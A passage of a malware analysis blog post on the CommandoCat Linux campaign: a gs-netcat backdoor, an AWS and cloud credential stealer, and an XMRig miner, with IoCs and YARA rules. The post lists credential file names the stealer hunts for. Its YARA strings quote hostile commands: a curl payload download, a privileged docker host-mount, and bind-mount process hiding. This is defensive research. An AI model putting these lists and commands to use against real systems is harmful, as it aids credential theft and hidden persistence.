<p>Once the binary has been installed, the script creates a malicious systemd service unit in order to achieve persistence. This is a very common method for Linux malware to obtain persistence, however not all systems use systemd, resulting in this payload being rendered entirely ineffective on these systems. $VICCS is the shared secret discussed earlier, which is stored in a file and passed to the process.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9902,"width":"376px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_02_58-PM.png" alt="" class="wp-image-9902" style="width:376px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The script then uses the previously discussed <code>hid</code> binary in order to hide the <code>gs-netcat</code> process. It is worth noting that this will not survive a reboot, as there is no mechanism to hide the process again after it is respawned by systemd.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9903,"width":"570px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_03_13-PM.png" alt="" class="wp-image-9903" style="width:570px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Finally, the malware sends the shared secret to the attacker via their API, much like how it does with SSH:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9904,"width":"315px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_03_37-PM.png" alt="" class="wp-image-9904" style="width:315px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This allows the attacker to run their client instance of <code>gs-netcat</code> with the shared secret, and gain persistent access to the infected machine.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">aws.sh</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The aws.sh script is a credential grabber that pulls credentials from a number of files on disk, as well as IMDS, and environment variables. Interestingly, the script creates a file so that once the script runs the first time, it can never be run again as the file is never removed. This is potentially to avoid arousing suspicion by generating lots of calls to IMDS or the AWS API, as well as making the keys harvested by the attacker distinct per infected machine.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The script overall is very similar to scripts that have been <a href="https://malware.news/t/cloudy-with-a-chance-of-credentials-aws-targeting-cred-stealer-expands-to-azure-gcp/71346">previously attributed to TeamTNT</a> and could have been copied from one of their campaigns. However, script-based attribution is difficult, and while the similarities are visible, it is hard to attribute this script to any particular group.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9905,"width":"373px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_03_56-PM.png" alt="" class="wp-image-9905" style="width:373px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The first thing run by the script (if an AWS environment is detected) is the AWS grabber script. Firstly, it makes a number of requests to IMDS in order to obtain information about the instance’s IAM role and the security credentials for it. The timeout is likely used to stop this part of the script taking a long time to run on systems where IMDS is not available. It would also appear this script only works with IMDSv1, so can be rendered ineffective by enforcing IMDSv2.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9906,"width":"555px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_04_12-PM.png" alt="" class="wp-image-9906" style="width:555px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Information of interest to the attacker, such as instance profiles, access keys, and secret keys, are then extracted from the response and placed in a global variable called CSOF, which is used throughout the script to store captured information before sending it to the API.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Next, it checks environment variables on the instance for AWS related variables, and adds them to CSOF if they are present.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9909,"width":"520px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_05_54-PM.png" alt="" class="wp-image-9909" style="width:520px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Finally, it adds the sts caller identity returned from the AWS command line to CSOF.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Next up is the cred_files function, which executes a search for a number of common credential file names and reads their contents into CSOF if they are found. It has a few separate lists of files it will try to capture.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>CRED_FILE_NAMES:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:list --></p> 
<ul> 
 <!-- wp:list-item --> 
 <li>"authinfo2"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"access_tokens.db"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".smbclient.conf"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".smbcredentials"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".samba_credentials"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".pgpass"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"secrets"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".boto"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".netrc"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"netrc"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".git-credentials"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"api_key"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"censys.cfg"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"ngrok.yml"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"filezilla.xml"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"recentservers.xml"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"queue.sqlite3"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"servlist.conf"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"accounts.xml"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"kubeconfig"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"adc.json"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"azure.json"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"clusters.conf"&nbsp;</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"docker-compose.yaml"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".env"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
</ul> 
<p> 
 <!-- /wp:list --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>AWS_CREDS_FILES:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:list --></p> 
<ul> 
 <!-- wp:list-item --> 
 <li>"credentials"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".s3cfg"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".passwd-s3fs"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".s3backer_passwd"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".s3b_config"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"s3proxy.conf"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
</ul> 
<p> 
 <!-- /wp:list --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>GCLOUD_CREDS_FILES:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:list --></p> 
<ul> 
 <!-- wp:list-item --> 
 <li>"config_sentinel"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"gce"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".last_survey_prompt.yaml"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"config_default"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"active_config"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"credentials.db"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"access_tokens.db"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".last_update_check.json"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".last_opt_in_prompt.yaml"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>".feature_flags_config.yaml"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"adc.json"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>"resource.cache"</li> 
 <p> 
  <!-- /wp:list-item --></p> 
</ul> 
<p> 
 <!-- /wp:list --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The files are then grabbed by performing a find on the root file system for their name, and the results appended to a temporary file, before the final concatenation of the credentials files is read back into the CSOF variable.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9912,"width":"559px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_16_56-PM.png" alt="" class="wp-image-9912" style="width:559px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Next up is get_prov_vars, which simply loops through all processes in /proc and reads out their environment variables into CSOF. This is interesting as the payload already checks the environment variables in a lot of cases, such as in the aws, google, and azure grabbers. So it is unclear why they grab all data, but then grab specific portions of the data again.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9913,"width":"576px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_17_08-PM.png" alt="" class="wp-image-9913" style="width:576px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Regardless of what data it has already grabbed, get_google and get_azure functions are called next. These work identically to the AWS environment variable grabber, where it checks for the existence of a variable and then appends its contents (or the file’s contents if the variable is path) to CSOF.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9914,"width":"574px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_17_28-PM.png" alt="" class="wp-image-9914" style="width:574px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The final thing it grabs is an inspection of all running docker containers via the get_docker function. This can contain useful information about what's running in the container and on the box in general, as well as potentially providing more secrets that are passed to the container.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9915,"width":"535px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_17_37-PM.png" alt="" class="wp-image-9915" style="width:535px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The script then closes out by sending all of the collected data to the attacker. The attacker has set a username and password on their API endpoint for collected data, the purpose for which is unclear. It is possible that the attacker is concerned with the endpoint being leaked and consequently being spammed with false data by internet vigilantes, so added the authentication as a mechanism allowing them to cycle access by updating the payload and API.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9916,"width":"482px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_17_50-PM.png" alt="" class="wp-image-9916" style="width:482px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">The base64 payload</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>As mentioned earlier, the final payload is delivered as a base64 encoded script rather than in the traditional curl-into-bash method used previously by the malware. This base64 is echoed into <code>base64 -d</code>, and then piped into bash. This is an extremely common evasion mechanism, with many script-based Linux threat actors using the same approach. It is interesting to note that the C2 IP used in this script is different from the other payloads.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The base64 payload serves two primary purposes, to deploy an XMRig cryptominer, and to “secure” the docker install on the infected host.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>When it is run, the script looks for traces of other malware campaigns. Firstly, it removes all containers that have a command of /bin/bash -c 'apt-get or busybox, and then it removes all containers that do not have a command that contains <code>chroot</code> (which is the initial command used by this payload).</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9917,"width":"586px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_18_20-PM.png" alt="" class="wp-image-9917" style="width:586px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Next, it looks for any services named “c3pool_miner” or “moneroocean_miner” and stops &amp; disables the services. It then looks for associated binaries such as<code> /root/c3pool/xmrig</code> and <code>/root/moneroocean/xmrig</code> and deletes them from the filesystem. These steps are taken prior to deploying their own miner, so that they aren't competing for CPU time with other threat actors.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Once the competing miners have been killed off, it then sets up its own miner. It does this by grabbing a config and binary from the C2 server and extracting it to <code>/usr/sbin</code>. This drops two files: docker-cache and docker-proxy.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The docker-proxy binary is a custom fork of XMRig, with the path to the attacker’s config file hardcoded in the binary. It is invoked by docker-cache, which acts as a stager to ensure it is running, while also having the functionality to update the binary, should a file with .upd be detected.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>It then uses a systemd service to achieve persistence for the XMRig stager, using the name docker cache daemon to appear inconspicuous. It is interesting to note that the name <code>dockercache</code> was also used by the <a href="https://unit42.paloaltonetworks.com/cetus-cryptojacking-worm/">Cetus</a> cryptojacking worm.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9918,"width":"453px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_18_34-PM.png" alt="" class="wp-image-9918" style="width:453px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>It then uses the hid script discussed previously to hide the docker-cache and docker-proxy services by creating a bind mount over their /proc entry. The effect of this is that if a system administrator were to use a tool like <code>htop</code> to try and see what process was using up the CPU on the server, they would not be able to see the process.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Finally, the attacker “secures” docker. First, it pulls down alpine and tags it as <code>docker/firstrun</code> (this will become clear as to why later), and then deletes any images in a hardcoded list of images that are commonly used in other campaigns.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9934,"width":"569px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image-18.png" alt="" class="wp-image-9934" style="width:569px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Next, it blackholes the docker registry by writing it's hostname to /etc/hosts with an IP of 0.0.0.0</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9935,"width":"577px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image-19.png" alt="" class="wp-image-9935" style="width:577px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This completely blocks other attackers from pulling their images/tools onto the box, eliminating the risk of competition. Keeping the Alpine image named as docker/firstrun allows the attacker to still use the docker API to spawn an alpine box they can use to break back in, as it is already downloaded so the blackhole has no effect.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">Conclusion</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This malware sample, despite being primarily scripts, is a sophisticated campaign with a large amount of redundancy and evasion that makes detection challenging. The usage of the hid process hider script is notable as it is not commonly seen, with most malware opting to deploy clunkier rootkit kernel modules. The Docker Registry blackhole is also novel, and very effective at keeping other attackers off the box.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The malware functions as a credential stealer, highly stealthy backdoor, and cryptocurrency miner all in one. This makes it versatile and able to extract as much value from infected machines as possible. The payloads seem similar to payloads deployed by other threat actors, with the AWS stealer in particular having a lot of overlap with scripts attributed to TeamTNT in the past. Even the C2 IP points to the same provider that has been used by TeamTNT in the past. It is possible that this group is one of the many copycat groups that have built on the work of TeamTNT.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">IoCs</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">Hashes </h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:table --></p> 
<figure class="wp-block-table"> 
 <table> 
  <tbody> 
   <tr> 
    <td>user</td> 
    <td>5ea102a58899b4f446bb0a68cd132c1d</td> 
   </tr> 
   <tr> 
    <td>tshd</td> 
    <td>73432d368fdb1f41805eba18ebc99940</td> 
   </tr> 
   <tr> 
    <td>gsc</td> 
    <td>5ea102a58899b4f446bb0a68cd132c1d</td> 
   </tr> 
   <tr> 
    <td>aws</td> 
    <td>25c00d4b69edeef1518f892eff918c2c</td> 
   </tr> 
   <tr> 
    <td>base64</td> 
    <td>ec2882928712e0834a8574807473752a</td> 
   </tr> 
  </tbody> 
 </table> 
</figure> 
<p> 
 <!-- /wp:table --></p> 
<p> 
 <!-- wp:heading {"level":3} --></p> 
<h3 class="wp-block-heading">IPs</h3> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:table --></p> 
<figure class="wp-block-table"> 
 <table> 
  <tbody> 
   <tr> 
    <td>45[.]9.148.193</td> 
   </tr> 
   <tr> 
    <td>103[.]127.43.208</td> 
   </tr> 
  </tbody> 
 </table> 
</figure> 
<p> 
 <!-- /wp:table --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">Yara Rule</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:code --></p> 
<pre class="wp-block-code"><code class="">rule Stealer_Linux_CommandoCat {<br>
	meta:<br>
        description = "Detects CommandoCat aws.sh credential stealer script"<br>
        license = "Apache License 2.0"<br>
        date = "2024-01-25"<br>
        hash1 = "185564f59b6c849a847b4aa40acd9969253124f63ba772fc5e3ae9dc2a50eef0"<br>
    strings:<br>
        // Constants<br>
        $const1 = "CRED_FILE_NAMES"<br>
        $const2 = "MIXED_CREDFILES"<br>
        $const3 = "AWS_CREDS_FILES"<br>
        $const4 = "GCLOUD_CREDS_FILES"<br>
        $const5 = "AZURE_CREDS_FILES"<br>
        $const6 = "VICOIP"<br>
        $const7 = "VICHOST"
<p> // Functions<br> $func1 = "get_docker()"<br> $func2 = "cred_files()"<br> $func3 = "get_azure()"<br> $func4 = "get_google()"<br> $func5 = "run_aws_grabber()"<br> $func6 = "get_aws_infos()"<br> $func7 = "get_aws_meta()"<br> $func8 = "get_aws_env()"<br> $func9 = "get_prov_vars()"</p>
<p> // Log Statements<br> $log1 = "no dubble"<br> $log2 = "-------- PROC VARS -----------------------------------"<br> $log3 = "-------- DOCKER CREDS -----------------------------------"<br> $log4 = "-------- CREDS FILES -----------------------------------"<br> $log5 = "-------- AZURE DATA --------------------------------------"<br> $log6 = "-------- GOOGLE DATA --------------------------------------"<br> $log7 = "AWS_ACCESS_KEY_ID : $AWS_ACCESS_KEY_ID"<br> $log8 = "AWS_SECRET_ACCESS_KEY : $AWS_SECRET_ACCESS_KEY"<br> $log9 = "AWS_EC2_METADATA_DISABLED : $AWS_EC2_METADATA_DISABLED"<br> $log10 = "AWS_ROLE_ARN : $AWS_ROLE_ARN"<br> $log11 = "AWS_WEB_IDENTITY_TOKEN_FILE: $AWS_WEB_IDENTITY_TOKEN_FILE"</p>
<p> // Paths<br> $path1 = "/root/.docker/config.json"<br> $path2 = "/home/*/.docker/config.json"<br> $path3 = "/etc/hostname"<br> $path4 = "/tmp/..a.$RANDOM"<br> $path5 = "/tmp/$RANDOM"<br> $path6 = "/tmp/$RANDOM$RANDOM"</p>
<p> condition:<br> filesize &lt; 1MB and<br> all of them<br> }</p>
<p>rule Backdoor_Linux_CommandoCat {<br> meta:<br> description = "Detects CommandoCat gsc.sh backdoor registration script"<br> license = "Apache License 2.0"<br> date = "2024-01-25"<br> hash1 = "d083af05de4a45b44f470939bb8e9ccd223e6b8bf4568d9d15edfb3182a7a712"<br> strings:<br> // Constants<br> $const1 = "SRCURL"<br> $const2 = "SETPATH"<br> $const3 = "SETNAME"<br> $const4 = "SETSERV"<br> $const5 = "VICIP"<br> $const6 = "VICHN"<br> $const7 = "GSCSTATUS"<br> $const8 = "VICSYSTEM"<br> $const9 = "GSCBINURL"<br> $const10 = "GSCATPID"</p>
<p> // Functions<br> $func1 = "hidfile()"</p>
<p> // Log Statements<br> $log1 = "run gsc ..."</p>
<p> // Paths<br> $path1 = "/dev/shm/.nc.tar.gz"<br> $path2 = "/etc/hostname"<br> $path3 = "/bin/gs-netcat"<br> $path4 = "/etc/systemd/gsc"<br> $path5 = "/bin/hid"</p>
<p> // General<br> $str1 = "mount --bind /usr/foo /proc/$1"<br> $str2 = "cp /etc/mtab /usr/t"<br> $str3 = "docker run -t -v /:/host --privileged cmd.cat/tar tar xzf /host/dev/shm/.nc.tar.gz -C /host/bin gs-netcat"</p>
<p> condition:<br> filesize &lt; 1MB and<br> all of them<br> }</p>
<p>rule Backdoor_Linux_CommandoCat_tshd {<br> meta:<br> description = "Detects CommandoCat tshd TinyShell registration script"<br> license = "Apache License 2.0"<br> date = "2024-01-25"<br> hash1 = "65c6798eedd33aa36d77432b2ba7ef45dfe760092810b4db487210b19299bdcb"<br> strings:<br> // Constants<br> $const1 = "SRCURL"<br> $const2 = "HOME"<br> $const3 = "TSHDPID"</p>
<p> // Functions<br> $func1 = "setuptools()"<br> $func2 = "hidfile()"<br> $func3 = "hidetshd()"</p>
<p> // Paths<br> $path1 = "/var/tmp"<br> $path2 = "/bin/hid"<br> $path3 = "/etc/mtab"<br> $path4 = "/dev/shm/..tshdpid"<br> $path5 = "/tmp/.tsh.tar.gz"<br> $path6 = "/usr/sbin/tshd"<br> $path7 = "/usr/foo"<br> $path8 = "./tshd"</p>
<p> // General<br> $str1 = "curl -Lk $SRCURL/bin/tsh/tsh.tar.gz -o /tmp/.tsh.tar.gz"<br> $str2 = "find /dev/shm/ -type f -size 0 -exec rm -f {} \\;"</p>
</code><p><code class=""> condition:<br> filesize &lt; 1MB and<br> all of them<br> }</code></p></pre> 
<p> 
 <!-- /wp:code --></p></span></div>
      
    </div>
    
    <!-- End Blog Post Body -->
  
    <!-- Blog Post Author -->
    
    <!-- End Blog Post Author -->  
  

  
  </section>

  <div id="hs_cos_wrapper_u4m-blog-post-cards" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
  
  
  


